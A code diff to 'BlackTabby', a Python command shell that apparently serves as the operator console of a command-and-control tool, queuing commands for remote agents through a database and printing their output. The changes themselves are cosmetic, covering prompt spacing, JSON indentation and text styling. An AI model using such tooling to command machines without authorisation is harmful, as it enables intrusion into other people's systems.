@@ -5,7 +5,7 @@ import json
 from time import sleep
 
 class Shell(Cmd):
-    prompt = 'BlackTabby>'
+    prompt = 'BlackTabby > '
     intro = 'Welcome! Type ? to list commands'
 
 
@@ -26,7 +26,7 @@ class Shell(Cmd):
         db = self.db_connection
         agent = self.agent_id
         document = dict(db[agent])
-        print(json.dumps(document,sort_keys=True,indent=4))
+        print(json.dumps(document,sort_keys=True,indent=1))
 
     def help_get_all(self):
         print(Style.RESET_ALL)
@@ -57,6 +57,7 @@ class Shell(Cmd):
         doc = document_struct
         doc['pending_commands'].append(command)
         self.doc_id, self.doc_rev = db.save(doc)
+        print(Style.BRIGHT)
         print(Fore.YELLOW + "Sending command...' {} '.. Waiting on response...".format(command))
         print(Style.RESET_ALL)
         for x in range(0,15):
@@ -68,6 +69,7 @@ class Shell(Cmd):
             print(Fore.GREEN + "Successfuly executed command")
             print(Style.RESET_ALL)
         else:
+            print(Style.BRIGHT)
             print(Fore.RED + "Failed to run command...")
             print(Style.RESET_ALL)
             return 
@@ -75,6 +77,7 @@ class Shell(Cmd):
         #print(index)
         index -=1
         output = newdoc['completed_commands'][index]
+        print(Style.BRIGHT)
         print(Fore.YELLOW + str(newdoc['completed_commands'][index]))
         print(Style.RESET_ALL)
 
@@ -89,7 +92,7 @@ class Shell(Cmd):
         print(Style.RESET_ALL)
         if inp == 'x' or inp == 'q':
             return self.do_exit(inp)
-        print("Default: {}".format(inp))
+        #print("Default: {}".format(inp))
 
     do_EOF = do_exit
     help_EOF = help_exit
